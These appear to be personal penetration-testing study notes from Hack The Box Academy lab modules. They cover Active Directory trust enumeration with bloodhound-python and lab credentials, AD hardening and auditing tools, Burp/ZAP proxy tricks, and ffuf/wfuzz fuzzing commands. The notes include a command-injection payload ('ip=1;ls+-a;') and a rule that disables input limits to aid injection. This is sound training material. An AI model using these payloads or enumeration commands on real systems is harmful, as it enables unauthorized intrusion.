	> As noted in the last section, we may, from time to time, see users or admins from one domain as members of a group in another domain. Since only Domain Local Groups allow users from outside their forest, it is not uncommon to see a highly privileged user from Domain A as a member of the built-in administrators group in domain B when dealing with a bidirectional forest trust relationship. If we are testing from a Linux host, we can gather this information by using the Python implementation of BloodHound(https://github.com/fox-it/BloodHound.py). We can use this tool to collect data from multiple domains, ingest it into the GUI tool and search for these relationships.
	> On some assessments, our client may provision a VM for us that gets an IP from DHCP and is configured to use the internal domain's DNS. We will be on an attack host without DNS configured in other instances. In this case, we would need to edit our resolv.conf file to run this tool since it requires a DNS hostname for the target Domain Controller instead of an IP address. We can edit the file as follows using sudo rights. Here we have commented out the current nameserver entries and added the domain name and the IP address of ACADEMY-EA-DC01 as the nameserver.
	> Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf
		m1l0js@htb[/htb]$ cat /etc/resolv.conf 
			#nameserver 1.1.1.1
			#nameserver 8.8.8.8
			domain INLANEFREIGHT.LOCAL
			nameserver 172.16.5.5

	> Once this is in place, we can run the tool against the target domain as follows:
	> Running bloodhound-python Against INLANEFREIGHT.LOCAL

		m1l0js@htb[/htb]$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2

	> We can compress the resultant zip files to upload one single zip file directly into the BloodHound GUI.
	> Compressing the File with zip -r
		m1l0js@htb[/htb]$ zip -r ilfreight_bh.zip *.json

	> We will repeat the same process, this time filling in the details for the FREIGHTLOGISTICS.LOCAL domain.
	> Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf
		m1l0js@htb[/htb]$ cat /etc/resolv.conf 
			#nameserver 1.1.1.1
			#nameserver 8.8.8.8
			domain FREIGHTLOGISTICS.LOCAL
			nameserver 172.16.5.238

	> The bloodhound-python command will look similar to the previous one:
	> Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL
		m1l0js@htb[/htb]$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2

After uploading the second set of data (either each JSON file or as one zip file), we can click on Users with Foreign Domain Group Membership under the Analysis tab and select the source domain as INLANEFREIGHT.LOCAL. Here, we will see the built-in Administrator account for the INLANEFREIGHT.LOCAL domain is a member of the built-in Administrators group in the FREIGHTLOGISTICS.LOCAL domain as we saw previously.

-=-=
[+] Hardening Active Directory

	> Let's take some time to look at a few hardening measures that can be put in place to stop common TTPs like those we utilized in this module from being successful or providing any helpful information. Our goal as penetration testers is to help provide a better operational picture of our customers' network to their defenders and help improve their security posture. So we should understand some of the common defense tactics that can be implemented and how they would affect the networks we are assessing. These basic hardening steps will do much more for an organization (regardless of size) than purchasing the next big EDR or SIEM tool. Those extra defensive measures and equipment only help if you have a baseline security posture with features like logging enabled and proper documentation and tracking of the hosts within the network.

* Step One: Document and Audit
	> Proper AD hardening can keep attackers contained and prevent lateral movement, privilege escalation, and access to sensitive data and resources. One of the essential steps in AD hardening is understanding everything present in your AD environment. An audit of everything listed below should be done annually, if not every few months, to ensure your records are up to date. We care about:
	> Things To Document and Track
    		- Naming conventions of OUs, computers, users, groups
    		- DNS, network, and DHCP configurations
    		- An intimate understanding of all GPOs and the objects that they are applied to
    		- Assignment of FSMO roles
    		- Full and current application inventory
    		- A list of all enterprise hosts and their location
    		- Any trust relationships we have with other domains or outside entities
    		- Users who have elevated permissions

* People, Processes, and Technology
	> AD hardening can be broken out into the categories People, Process, and Technology. These hardening measures will encompass the hardware, software, and human aspects of any network.

* People
	> In even the most hardened environment, users remain the weakest link. Enforcing security best practices for standard users and administrators will prevent "easy wins" for pentesters and malicious attackers. We should also strive to keep our users educated and aware of threats to themselves. The measures below are a great way to start securing the Human element of an AD environment.
    	> The organization should have a strong password policy, with a password filter that disallows the use of common words (i.e., welcome, password, names of months/days/seasons, and the company name). If possible, an enterprise password manager should be used to assist users with choosing and using complex passwords.
    	> Rotate passwords periodically for all service accounts.
    	> Disallow local administrator access on user workstations unless a specific business need exists.
    	> Disable the default RID-500 local admin account and create a new admin account for administration subject to LAPS password rotation.
    	> Implement split tiers of administration for administrative users. Too often, during an assessment, you will gain access to Domain Administrator credentials on a computer that an administrator uses for all work activities.
    	> Clean up privileged groups. Does the organization need 50+ Domain/Enterprise Admins? Restrict group membership in highly privileged groups to only those users who require this access to perform their day-to-day system administrator duties.
    	> Where appropriate, place accounts in the Protected Users group.
    	> Disable Kerberos delegation for administrative accounts (the Protected Users group may not do this)

* Protected Users Group

	> The Protected Users group first appeared with Window Server 2012 R2. This group can be used to restrict what members of this privileged group can do in a domain. Adding users to Protected Users prevents user credentials from being abused if left in memory on a host.
	> Viewing the Protected Users Group with Get-ADGroup
		PS C:\Users\htb-student> Get-ADGroup -Identity "Protected Users" -Properties Name,Description,Members

	> The group provides the following Domain Controller and device protections:

    		- Group members can not be delegated with constrained or unconstrained delegation.
    		- CredSSP will not cache plaintext credentials in memory even if Allow delegating default credentials is set within Group Policy.
    		- Windows Digest will not cache the user's plaintext password, even if Windows Digest is enabled.
    		- Members cannot authenticate using NTLM authentication or use DES or RC4 keys.
    		- After acquiring a TGT, the user's long-term keys or plaintext credentials are not cached.
    		- Members cannot renew a TGT longer than the original 4-hour TTL.

	> Note: The Protected Users group can cause unforeseen issues with authentication, which can easily result in account lockouts. An organization should never place all privileged users in this group without staged testing.
	> Along with ensuring your users cannot cause harm to themselves, we should consider our policies and procedures for domain access and control.

* Processes
	> Maintaining and enforcing policies and procedures that can significantly impact an organization's overall security posture is necessary. Without defined policies, it is impossible to hold an organization's employees accountable, and difficult to respond to an incident without defined and practiced procedures such as a disaster recovery plan. The items below can help to define processes, policies, and procedures.

    	> Proper policies and procedures for AD asset management.
    	>     AD host audit, the use of asset tags, and periodic asset inventories can help ensure hosts are not lost.
    	> Access control policies (user account provisioning/de-provisioning), multi-factor authentication mechanisms.
    	> Processes for provisioning and decommissioning hosts (i.e., baseline security hardening guideline, gold images)
    	> AD cleanup policies
        	- Are accounts for former employees removed or just disabled?
        	- What is the process for removing stale records from AD?
        	- Processes for decommissioning legacy operating systems/services (i.e., proper uninstallation of Exchange when migrating to 0365).
        	- Schedule for User, groups, and hosts audit.

* Technology
	> Periodically review AD for legacy misconfigurations and new and emerging threats. As changes are made to AD, ensure that common misconfigurations are not introduced. Pay attention to any vulnerabilities introduced by AD and tools or applications utilized in the environment.

    		- Run tools such as BloodHound, PingCastle, and Grouper periodically to identify AD misconfigurations.
    		- Ensure that administrators are not storing passwords in the AD account description field.
    		- Review SYSVOL for scripts containing passwords and other sensitive data.
    		- Avoid the use of "normal" service accounts, utilizing Group Managed (gMSA) and Managed Service Accounts (MSA) where ever possible to mitigate the risk of Kerberoasting.
    		- Disable Unconstrained Delegation wherever possible.
    		- Prevent direct access to Domain Controllers through the use of hardened jump hosts.
    		- Consider setting the ms-DS-MachineAccountQuota attribute to 0, which disallows users from adding machine accounts and can prevent several attacks such as the noPac attack and Resource-Based Constrained Delegation (RBCD)
    		- Disable the print spooler service wherever possible to prevent several attacks
    		- Disable NTLM authentication for Domain Controllers if possible
    		- Use Extended Protection for Authentication along with enabling Require SSL only to allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services
    		- Enable SMB signing and LDAP signing
    		- Take steps to prevent enumeration with tools like BloodHound
    		- Ideally, perform quarterly penetration tests/AD security assessments, but if budget constraints exist, these should be performed annually at the very least.
    		- Test backups for validity and review/practice disaster recovery plans.
    		- Enable the restriction of anonymous access and prevent null session enumeration by setting the RestrictNullSessAccess registry key to 1 to restrict null session access to unauthenticated users.

* Protections By Section

As a different look at this, we have broken out the significant actions by section and correlated controls based on the TTP and a MITRE tag. Each tag corresponds with a section of the Enterprise ATT&CK Matrix found here. Any tag marked as TA corresponds to an overarching tactic, while a tag marked as T### is a technique found in the matrix under tactics.
TTP 				MITRE Tag 	Description
External Reconnaissance 	T1589 		This portion of an attack is extremely hard to detect and defend against. An attacker does not have to interact with your enterprise environment directly, so it's impossible to tell when it is happening. What can be done is to monitor and control the data you release publically to the world. Job postings, documents (and the metadata left attached), and other open information sources like BGP and DNS records all reveal something about your enterprise. Taking care to scrub documents before release can ensure an attacker cannot glean user naming context from them as an example. The same can be said for not providing detailed information about tools and equipment utilized in your networks via job postings.

Internal Reconnaissance 	T1595 		For reconnaissance of our internal networks, we have more options. This is often considered an active phase and, as such, will generate network traffic which we can monitor and place defenses based on what we see. Monitoring network traffic for any suspicious bursts of packets of a large volume from any one source or several sources can be indicative of scanning. A properly configured Firewall or Network Intrusion Detection System (NIDS) will spot these trends quickly and alert on the traffic. Depending on the tool or appliance, it may even be able to add a rule blocking traffic from said hosts proactively. The utilization of network monitoring coupled with a SIEM can be crucial to spotting reconnaissance. Properly tuning the Windows Firewall settings or your EDR of choice to not respond to ICMP traffic, among other types of traffic, can help deny an attacker any information they may glean from the results.

Poisoning 			T1557 	Utilizing security options like SMB message signing and encrypting traffic with a strong encryption mechanism will go a long way to stopping poisoning & man-in-the-middle attacks. SMB signing utilizes hashed authentication codes and verifies the identity of the sender and recipient of the packet. These actions will break relay attacks since the attacker is just spoofing traffic.

Password Spraying 		T1110/003 	This action is perhaps the easiest to defend against and detect. Simple logging and monitoring can tip you off to password spraying attacks in your network. Watching your logs for multiple attempts to login by watching Event IDs 4624 and 4648 for strings of invalid attempts can tip you off to password spraying or brute force attempts to access the host. Having strong password policies, an account lockout policy set, and utilizing two-factor or multi-factor authentication can all help prevent the success of a password spray attack. For a deeper look at the recommended policy settings, check out this article and the NIST documentation.

Credentialed Enumeration 	TA0006 		There is no real defense you can put in place to stop this method of attack. Once an attacker has valid credentials, they effectively can perform any action that the user is allowed to do. A vigilant defender can detect and put a stop to this, however. Monitoring for unusual activity such as issuing commands from the CLI when a user should not have a need to utilize it. Multiple RDP requests sent from host to host within the network or movement of files from various hosts can all help tip a defender off. If an attacker manages to acquire administrative privileges, this can become much more difficult, but there are network heuristics tools that can be put in place to analyze the network constantly for anomalous activity. Network segmentation can help a lot here.

LOTL 				N/A 		It can be hard to spot an attacker while they are utilizing the resources built-in to host operating systems. This is where having a baseline of network traffic and user behavior comes in handy. If your defenders understand what the day-to-day regular network activity looks like, you have a chance to spot the abnormal. Watching for command shells and utilizing a properly configured Applocker policy can help prevent the use of applications and tools users should not have access to or need.

Kerberoasting 			T1558/003 	Kerberoasting as an attack technique is widely documented, and there are plenty of ways to spot it and defend against it. The number one way to protect against Kerberoasting is to utilize a stronger encryption scheme than RC4 for Kerberos authentication mechanisms. Enforcing strong password policies can help prevent Kerberoasting attacks from being successful. Utilizing Group Managed service accounts is probably the best defense as this makes Kerberoasting no longer possible. Periodically auditing your users' account permissions for excessive group membership can be an effective way to spot issues.


-=-=
[+] Additional AD Auditing Techniques

	> Along with discussing the hardening of an AD domain, we wanted to discuss AD auditing. We want to provide our customers with as much information as possible to help solve the potential issues we find. Doing so will give them more data to prove they have a problem and help acquire backing and funding to tackle those fixes. The tools in this section can be utilized to provide different visualizations and data output for this purpose.

* Creating an AD Snapshot with Active Directory Explorer
	> AD Explorer is part of the Sysinternal Suite and is described as:
	> "An advanced Active Directory (AD) viewer and editor. You can use AD Explorer to navigate an AD database easily, define favorite locations, view object properties, and attributes without opening dialog boxes, edit permissions, view an object's schema, and execute sophisticated searches that you can save and re-execute."
	> AD Explorer can also be used to save snapshots of an AD database for offline viewing and comparison. We can take a snapshot of AD at a point in time and explore it later, during the reporting phase, as you would explore any other database. It can also be used to perform a before and after comparison of AD to uncover changes in objects, attributes, and security permissions.
	> When we first load the tool, we are prompted for login credentials or to load a previous snapshot. We can log in with any valid domain user.
	> Once logged in, we can freely browse AD and view information about all objects.
	> To take a snapshot of AD, go to File --> Create Snapshot and enter a name for the snapshot. Once it is complete, we can move it offline for further analysis.

* PingCastle

	> PingCastle(https://www.pingcastle.com/documentation/) is a powerful tool that evaluates the security posture of an AD environment and provides us the results in several different maps and graphs. Thinking about security for a second, if you do not have an active inventory of the hosts in your enterprise, PingCastle can be a great resource to help you gather one in a nice user-readable map of the domain. PingCastle is different from tools such as PowerView and BloodHound because, aside from providing us with enumeration data that can inform our attacks, it also provides a detailed report of the target domain's security level using a methodology based on a risk assessment/maturity framework. The scoring shown in the report is based on the Capability Maturity Model Integration (CMMI). For a quick look at the help context provided, you can issue the --help switch in cmd-prompt.
	> Running PingCastle
	> To run PingCastle, we can call the executable by typing PingCastle.exe into our CMD or PowerShell window or by clicking on the executable, and it will drop us into interactive mode, presenting us with a menu of options inside the Terminal User Interface (TUI).
	> This is the main functionnality of PingCastle. In a matter of minutes, it produces a report which will give you an overview of your Active Directory security. This report can be generated on other domains by using the existing trust links.
	> The default option is the healthcheck run, which will establish a baseline overview of the domain, and provide us with pertinent information dealing with misconfigurations and vulnerabilities. Even better, PingCastle can report recent vulnerability susceptibility, our shares, trusts, the delegation of permissions, and much more about our user and computer states. Under the Scanner option, we can find most of these checks.
	> Throughout the report, there are sections such as domain, user, group, and trust information and a specific table calling out "anomalies" or issues that may require immediate attention. We will also be presented with the domain's overall risk score.
	> Aside from being helpful in performing very thorough domain enumeration when combined with other tools, PingCastle can be helpful to give clients a quick analysis of their domain security posture, or can be used by internal teams to self-assess and find areas of concern or opportunities for further hardening. Take some time to explore the reports and maps PingCastle can generate on the Inlanefreight domain.

* Group Policy
	> With group policy being a large portion of how AD user and computer management is done, it's only logical that we would want to audit their settings and highlight any potential holes. Group3r is an excellent tool for this.

* Group3r
	> Group3r(https://github.com/Group3r/Group3r) is a tool purpose-built to find vulnerabilities in Active Directory associated Group Policy. Group3r must be run from a domain-joined host with a domain user (it does not need to be an administrator), or in the context of a domain user (i.e., using runas /netonly).
	> Group3r Basic Usage
	> C:\htb> group3r.exe -f <filepath-name.log> 
	> When running Group3r, we must specify the -s or the -f flag. These will specify whether to send results to stdout (-s), or to the file we want to send the results to (-f). For more options and usage information, utilize the -h flag, or check out the usage info at the link above.
	> When reading the output from Group3r, each indentation is a different level, so no indent will be the GPO, one indent will be policy settings, and another will be findings in those settings. Below we will take a look at the output shown from a finding. => (https://academy.hackthebox.com/storage/modules/143/grouper-finding.png)
	> In the image above, you will see an example of a finding from Group3r. It will present it as a linked box to the policy setting, define the interesting portion and give us a reason for the finding. It is worth the effort to run Group3r if you have the opportunity. It will often find interesting paths or objects that other tools will overlook.

* ADRecon

	> Finally, there are several other tools out there that are useful for gathering a large amount of data from AD at once. In an assessment where stealth is not required, it is also worth running a tool like ADRecon(https://github.com/adrecon/ADRecon) and analyzing the results, just in case all of our enumeration missed something minor that may be useful to us or worth pointing out to our client.
	> Running ADRecon
		PS C:\htb> .\ADRecon.ps1

	> Once done, ADRecon will drop a report for us in a new folder under the directory we executed from. We can see an example of the results in the terminal below. You will get a report in HTML format and a folder with CSV results. When generating the report, it should be noted that the program Excel needs to be installed, or the script will not automatically generate the report in that manner; it will just leave you with the .csv files. If you want output for Group Policy, you need to ensure the host you run from has the GroupPolicy PowerShell module installed. We can go back later and generate the Excel report from another host using the -GenExcel switch and feeding in the report folder.



[+] Beyond this Module

Real World

As a Penetration Tester, one could expect the tasks provided in this module to a part of our day-to-day duties. Having a deep understanding of AD and what we can glean from it (access and enumeration-wise) is essential to fulfill the duties of the role. Our actions may often influence the actions of our teammates and senior testers if we are working on an assessment as a team. Those actions could include:

    Taking advantage of cross-domain trusts to infiltrate other domains
    Persistence methods
    Command and Control within the domain for assessments that have longer windows,

With the modern enterprise moving toward hybrid and cloud environments, understanding the foundations within AD and how to abuse them will be extremely helpful when attempting to pivot to these new types of networks. If any of the concepts, terminology, or actions discussed in this module were a bit challenging or confusing, consider going back and checking out the Introduction To Active Directory module. It contains a deep dive into all things AD and helps lay a foundation of knowledge needed to understand Active Directory.
What's Next?

Check out the Active Directory BloodHound module to better understand how BloodHound works. Also, check out the Active Directory LDAP and Active Directory PowerView modules. The Cracking Passwords with Hashcat module can also help improve our understanding of the actions we took in the Kerberoasting and Password Spraying sections.
More AD Learning Opportunities

The Hack The Box main platform has many targets for learning and practicing AD enumeration and attacks. The AD Track on the main HTB platform is an excellent resource for practice. Tracks are curated lists of machines and challenges for users to work through and master a particular topic. The AD Track contains boxes of varying difficulties with various attack vectors. Even if you cannot solve these boxes on your own, it is still worth working with them with a walkthrough or video or just watching the video on the box by Ippsec. The more you expose yourself to these topics, the more comfortable and second nature enumeration and many attacks will become. The boxes below are great to practice the skills learned in this module.
Boxes To Pwn

    Forest
    Active
    Reel
    Mantis
    Blackfield
    Monteverde

Great Videos to Check Out

Six Degrees of Domain Admin from DEFCON 24 is a great watch for an introduction to BloodHound. ==> (https://youtu.be/wP8ZCczC1OU)
Designing AD DACL Backdoors by Will Schroeder and Andy Robbins is a gem if you haven't seen it. => (https://youtu.be/_nGpZ1ydzS8)
Kicking The Guard Dog of Hades is one of the original releases for Kerberoasting and is a great watch. => (https://www.youtube.com/watch?v=PUyhlN-E5MU)
In Kerberoasting 101, Tim Medin does an excellent job dissecting the Kerberoasting attack and how to perform them. => (https://youtu.be/Jaa2LmZaNeU)

There are so many more, but building a list here would take a whole other section. The videos above are a great start to advancing your AD knowledge.
Writers and Blogs To Follow

Between the HTB Discord, Forums, and blogs, there are plenty of outstanding write-ups to help advance your skills along the way. One to pay attention to would be 0xdf's walkthroughs. These are also a great resource to understand how an Active Directory attack path may look in the real world. 0xdf writes about much more, and his blog is an excellent resource. The list below contains links to other authors and blogs we feel do a great job discussing AD security topics and much more.

SpecterOps has an interesting blog where they talk about AD, BloodHound, Command and Control, and so much more.
Harmj0y writes quite a bit about AD, among other things as well. He is someone you should be following if you are looking to work in this industry.
AD Security Blog by Sean Metcalf is a treasure box full of awesome content, all AD and security related. It is a must-read if you are focused on Active Directory.
Shenaniganslabs is a great group of security researchers discussing many different topics in the security realm. These can include new vulnerabilities to Threat Actor TTPs.
Dirk-jan Mollema also has a great blog documenting his adventures with AD security, Azure, protocols, vulnerabilities, Python, etc.
The DFIR Report is maintained by a talented team of Blue Teamers/Infosec Content creators that share their findings from recent intrusion incidents in incredible detail. Many of their posts showcase AD attacks and the artifacts that attackers leave behind.

-=-=-=-=
=-=-=-=-
[+] Intro to Web Proxies

* ZAP 
	> ZAP can also be downloaded as a cross-platform JAR file and launched with the java -jar command or by double-clicking on it, similarly to Burp.
		zaproxy 
* Tip: If you prefer to use to a dark theme, you may do so in Burp by going to (User Options>Display) and selecting "dark" under (theme), and in ZAP by going to (Tools>Options>Display) and selecting "Flat Dark" in (Look and Feel).
* Installing CA certificate
	> Burp 
		http://burp
	> ZAP 
		Tools>Options>Dynamic SSL Certificate), then click on Save
	
* Show/hide elements
	> Burp: Proxy>Options>Response Modification
	> ZAP: Show/Enable button
* Show comments
	> zap: hud>comments
* Automatic request modification
	> We can choose to match any text within our requests, either in the request header or request body, and then replace them with different text. For the sake of demonstration, let's replace our User-Agent with HackTheBox Agent 1.0, which may be handy in cases where we may be dealing with filters that block certain User-Agents.
		> Burp Match and Replace
			- We can go to (Proxy>Options>Match and Replace) and click on Add in Burp. As the below screenshot shows, we will set the following options: (https://academy.hackthebox.com/storage/modules/110/burp_match_replace_user_agent_1.jpg)
			- Type: Request header	Since the change we want to make will be in the request header and not in its body.
			- Match: ^User-Agent.*$	The regex pattern that matches the entire line with User-Agent in it.
			- Replace: User-Agent: HackTheBox Agent 1.0	This is the value that will replace the line we matched above.
			- Regex match: True	We don't know the exact User-Agent string we want to replace, so we'll use regex to match any value that matches the pattern we specified above.
		> ZAP Replacer
			- ZAP has a similar feature called Replacer, which we can access by pressing [CTRL+R] or clicking on Replacer in ZAP's options menu. It is fairly similar to what we did above, so we can click on Add and add the same options we user earli
			    Description: HTB User-Agent.
			    Match Type: Request Header (will add if not present).
			    Match String: User-Agent. We can select the header we want from the drop-down menu, and ZAP will replace its value.
			    Replacement String: HackTheBox Agent 1.0.
			    Enable: True.
		> ZAP also has the Request Header String that we can use with a Regex pattern. Try using this option with the same values we used for Burp to see how it works.
		> ZAP also provides the option to set the Initiators, which we can access by clicking on the other tab in the windows shown above. Initiators enable us to select where our Replacer option will be applied. We will keep the default option of Apply to all HTTP(S) messages to apply everywhere.
			+ Other example of replacement
				Change input type to text:
				- Match Type: Response Body String.
				- Match Regex: False.
				- Match String: type="number".
				- Replacement String: type="text".
				- Enable: True.
				
				Change max length to 100:
				- Match Type: Response Body String.
				- Match Regex: False.
				- Match String: maxlength="3".
				- Replacement String: maxlength="100".
				- Enable: True.
			
		> We can now enable request interception by pressing [CTRL+B], then can visit any page in the pre-configured ZAP browser:

* Automatic Response Modification
	> The same concept can be used with HTTP responses as well. In the previous section, you may have noticed when we intercepted the response that the modifications we made to the IP field were temporary and were not applied when we refreshed the page unless we intercepted the response and added them again. To solve this, we can automate response modification similarly to what we did above to automatically enable any characters in the IP field for easier command injection.
	> Let us go back to (Proxy>Options>Match and Replace) in Burp to add another rule. This time we will use the type of Response body since the change we want to make exists in the response's body and not in its headers. In this case, we do not have to use regex as we know the exact string we want to replace, though it is possible to use regex to do the same thing if we prefer.
    		- Type: Response body.
    		- Match: type="number".
    		- Replace: type="text".
    		- Regex match: False.
	> Try adding another rule to change maxlength="3" to maxlength="100".
	> Now, once we refresh the page with [CTRL+SHIFT+R], we'll see that we can add any input to the input field, and this should persist between page refreshes as well:
	> We can now click on Ping, and our command injection should work without intercepting and modifying the request.

* Some payloads to crash the logic of the webapp
	ip=1;ls+-a; //post method

* URL encoding
	> Some of the key characters we need to encode are:
    		- Spaces: May indicate the end of request data if not encoded
    		- &: Otherwise interpreted as a parameter delimiter
    		- #: Otherwise interpreted as a fragment identifier

* Proxying tools
	> proxychains
	> nmap 
		m1l0js@htb[/htb]$ nmap --proxies http://127.0.0.1:8080 SERVER_IP -pPORT -Pn -sC
	> metasploit
		set proxies HTTP://127.0.0.1:8080

* Burp intruder 
	> Type of attacks ==> (https://portswigger.net/burp/documentation/desktop/tools/intruder/positions#attack-type)
		- Note: Be sure to leave the extra two lines at the end of the request, otherwise we may get an error response from the server.
	> Next, we need to select the Payload Type, which is the type of payloads/wordlists we will be using. Burp provides a variety of Payload Types, each of which acts in a certain way. For example:
    		- Simple List: The basic and most fundamental type. We provide a wordlist, and Intruder iterates over each line in it.
    		- Runtime file: Similar to Simple List, but loads line-by-line as the scan runs to avoid excessive memory usage by Burp. (With a very large wordlist)
    		- Character Substitution: Lets us specify a list of characters and their replacements, and Burp Intruder tries all potential permutations.

	> Payload processing
		- /opt/useful/SecLists/Discovery/Web-Content/common.txt 
		- Let's try adding a rule that skips any lines that start with a . (as shown in the wordlist screenshot earlier). We can do that by clicking on the Add button and then selecting Skip if matches regex, which allows us to provide a regex pattern for items we want to skip. Then, we can provide a regex pattern that matches lines starting with ., which is: ^\..*$:
	> Payload encoding

* ZAP Fuzzer
	> Payloads
		+ The attack payloads in ZAP's Fuzzer are similar in concept to Intruder's Payloads, though they are not as advanced as Intruder's. We can click on the Add button to add our payloads and select from 8 different payload types. The following are some of them:

    		- File: This allows us to select a payload wordlist from a file.
    		- File Fuzzers: This allows us to select wordlists from built-in databases of wordlists.
    		- Numberzz: Generates sequences of numbers with custom increments.

		+ One of the advantages of ZAP Fuzzer is having built-in wordlists we can choose from so that we do not have to provide our own wordlist. More databases can be installed from the ZAP Marketplace, as we will see in a later section. So, we can select File Fuzzers as the Type, and then we will select the first wordlist from dirbuster:

* Using wfuzz
	wfuzz -z file --zP fn=users.txt,encoder=md5  -b cookie=FUZZ --hh 246  http://138.68.162.218:30658/skills/
	wfuzz -z file --zP fn=users.txt,encoder=md5  -b cookie=FUZZ --hh 246  http://138.68.162.218:30658/skills/
	curl -s --cookie "cookie=ee11cbb19052e40b07aac0ca060c23ee" http://138.68.162.218:30658/skills/

	wfuzz -e payloads

* Active scanner	
	+ BURP	
		+ We finally reach the most powerful part of Burp Scanner, which is its Active Vulnerability Scanner. An active scan runs a more comprehensive scan than a Passive Scan, as follows:
    			- It starts by running a Crawl and a web fuzzer (like dirbuster/ffuf) to identify all possible pages
    			- It runs a Passive Scan on all identified pages
    			- It checks each of the identified vulnerabilities from the Passive Scan and sends requests to verify them
    			- It performs a JavaScript analysis to identify further potential vulnerabilities
    			- It fuzzes various identified insertion points and parameters to look for common vulnerabilities like XSS, Command Injection, SQL Injection, and other common web vulnerabilities

-==-=-=
[+] Attacking web applications with ffuf
	> The specific wordlist we will be utilizing for pages and directory fuzzing is another commonly used wordlist called directory-list-2.3. 
* Tip: Taking a look at this wordlist we will notice that it contains copyright comments at the beginning, which can be considered as part of the wordlist and clutter the results. We can use the following command to get rid of these lines with the -ic flag.

# Ffuf

| **Command**   | **Description**   |
| --------------|-------------------|
| `ffuf -h` | ffuf help |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ` | Directory Fuzzing |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ` | Extension Fuzzing |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php` | Page Fuzzing |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v` | Recursive Fuzzing |
| `ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/` | Sub-domain Fuzzing |
| `ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx` | VHost Fuzzing |
| `ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx` | Parameter Fuzzing - GET |
| `ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx` | Parameter Fuzzing - POST |
| `ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx` | Value Fuzzing |  

# Wordlists

| **Command**   | **Description**   |
| --------------|-------------------|
| `/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt` | Directory/Page Wordlist |
| `/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt` | Extensions Wordlist |
| `/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt` | Domain Wordlist |
| `/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt` | Parameters Wordlist |

# Misc

| **Command**   | **Description**   |
| --------------|-------------------|
| `sudo sh -c 'echo "SERVER_IP  academy.htb" >> /etc/hosts'` | Add DNS entry |
| `for i in $(seq 1 1000); do echo $i >> ids.txt; done` | Create Sequence Wordlist |
| `curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'` | curl w/ POST |

* Directory Fuzzing
	> As we can see from the example above, the main two options are -w for wordlists and -u for the URL. We can assign a keyword to a wordlist to refer to it where we want to fuzz. For example, we can pick our wordlist and assign the keyword FUZZ to it by adding :FUZZ after it:
		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ
	> Next, as we want to be fuzzing for web directories, we can place the FUZZ keyword where the directory would be within our URL, with:
		m1l0js@htb[/htb]$ ffuf -w <SNIP> -u http://SERVER_IP:PORT/FUZZ
	> Now, let's start our target in the question below and run our final command on it:
		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ
	> We see that ffuf tested for almost 90k URLs in less than 10 seconds. This speed may vary depending on your internet speed and ping if you used ffuf on your machine, but it should still be extremely fast.
	> We can even make it go faster if we are in a hurry by increasing the number of threads to 200, for example, with -t 200, but this is not recommended, especially when used on a remote site, as it may disrupt it, and cause a Denial of Service, or bring down your internet connection in severe cases. 

* Extension Fuzzing
	> One common way to identify that is by finding the server type through the HTTP response headers and guessing the extension. For example, if the server is apache, then it may be .php, or if it was IIS, then it could be .asp or .aspx, and so one. This method is not very practical, though. So, we will again utilize ffuf to fuzz the extension, similar to how we fuzzed for directories. Instead of placing the FUZZ keyword where the directory name would be, we would place it where the extension would be .FUZZ, and use a wordlist for common extensions. We can utilize the following wordlist in SecLists for extensions:
		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ <SNIP>
	> Before we start fuzzing, we must specify which file that extension would be at the end of! We can always use two wordlists and have a unique keyword for each, and then do FUZZ_1.FUZZ_2 to fuzz for both. However, there is one file we can always find in most websites, which is index.*, so we will use it as our file and fuzz extensions on it.
	> Note: The wordlist we chose already contains a dot (.), so we will not have to add the dot after "index" in our fuzzing.
	> Now, we can rerun our command, carefully placing our FUZZ keyword where the extension would be after index:
		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ
We do get a couple of hits, but only .php gives us a response with code 200. Great! We now know that this website runs on PHP to start fuzzing for PHP files.

* Page Fuzzing
	> We will now use the same concept of keywords we've been using with ffuf, use .php as the extension, place our FUZZ keyword where the filename should be, and use the same wordlist we used for fuzzing directories:
		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php
		index                   [Status: 200, Size: 0, Words: 1, Lines: 1]
		REDACTED                [Status: 200, Size: 465, Words: 42, Lines: 15]
